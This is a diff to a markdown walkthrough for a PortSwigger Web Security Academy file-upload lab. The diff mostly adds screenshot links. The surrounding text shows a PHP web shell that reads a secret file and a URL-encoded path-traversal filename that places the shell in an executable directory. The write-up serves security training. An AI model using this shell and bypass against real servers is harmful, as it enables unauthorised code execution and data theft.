@@ -18,13 +18,15 @@ The application attempts to prevent malicious activity by disabling file executi
 ### 1. Identify the Execution Restriction
 1. Log in and upload a PHP shell: `<?php echo file_get_contents('/home/carlos/secret'); ?>`.
 2. Access the file via `GET /files/avatars/exploit.php`.
-3. **Observation:** The server returns the raw PHP code as plain text. This confirms that the `/avatars/` directory is restricted from executing scripts.
+3. ![Uploaded Image](https://github.com/zackrage99/portswigger-web-security-solutions/blob/main/images/File%20upload%20vulnerabilities/lab3/first_shell.png)
+4. **Observation:** The server returns the raw PHP code as plain text. This confirms that the `/avatars/` directory is restricted from executing scripts.
 
 ### 2. Intercept and Modify the Upload Request
 1. Capture the `POST /my-account/avatar` request using **Burp Suite**.
 2. Send the request to **Burp Repeater**.
 3. Attempt to change the filename to `filename="../exploit.php"` to move the file to the parent folder.
-4. **Observation:** If the response shows the file was still saved in `/avatars/`, the server is stripping the `../` characters to prevent traversal.
+4. ![Uploaded Image](https://github.com/zackrage99/portswigger-web-security-solutions/blob/main/images/File%20upload%20vulnerabilities/lab3/path_traversal.png)
+5. **Observation:** If the response shows the file was still saved in `/avatars/`, the server is stripping the `../` characters to prevent traversal.
 
 ### 3. Bypass the Filter with URL Encoding
 In Burp Repeater, obfuscate the traversal sequence to bypass the server's security filter:
@@ -36,11 +38,13 @@ In Burp Repeater, obfuscate the traversal sequence to bypass the server's securi
     <?php echo file_get_contents('/home/carlos/secret'); ?>
     ```
 3. Send the request. The server should now process the traversal and save the file in the `/files/` directory.
+4. ![Uploaded Image](https://github.com/zackrage99/portswigger-web-security-solutions/blob/main/images/File%20upload%20vulnerabilities/lab3/filter_bypass.png)
 
 ### 4. Execute and Retrieve the Secret
 1. Change your request in Burp (or use your browser) to target the parent directory: 
    `GET /files/exploit.php`
-2. **Observation:** Because the `/files/` directory permits execution, the server processes the PHP and returns the secret.
+   
+3. **Observation:** Because the `/files/` directory permits execution, the server processes the PHP and returns the secret.
 
 ### 5. Lab Completion
 Copy the secret string from the response and submit it to solve the lab.
